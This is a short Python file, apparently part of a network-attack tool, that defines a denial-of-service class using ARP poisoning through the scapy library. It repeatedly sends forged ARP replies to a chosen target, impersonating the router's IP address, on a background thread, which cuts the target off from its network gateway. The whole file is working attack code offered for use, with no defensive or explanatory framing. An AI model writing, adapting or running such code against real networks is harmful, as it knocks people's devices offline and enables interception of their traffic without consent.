import scapy.all as scapy
from src.client import Client
import threading

class DOS():
    """
    DOS Attack using Arp Poising.
    """
    def __init__(self, router: Client, target: Client) -> None:
        self.router = router
        self.target = target
        self.stop = False
    
    def __spoof(self):
        p1 = scapy.ARP(op=2, pdst=self.target.ip, hwdst=self.target.mac, psrc=self.router.ip)
        while not self.stop:
            try:
                scapy.send(p1, verbose=False)
            except:
                self.stop = True

    def start(self):
        t = threading.Thread(target=self.__spoof)
        t.start()
        